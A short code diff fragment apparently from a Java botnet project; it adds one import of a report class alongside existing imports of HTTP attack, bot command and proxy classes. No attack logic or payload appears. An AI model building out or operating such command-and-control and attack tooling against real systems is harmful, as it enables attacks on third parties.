@@ -29,6 +29,7 @@ import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.CommandScope;
 import com.acmutv.botnet.core.control.command.serial.BotCommandJsonMapper;
+import com.acmutv.botnet.core.report.SimpleReport;
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.time.Interval;
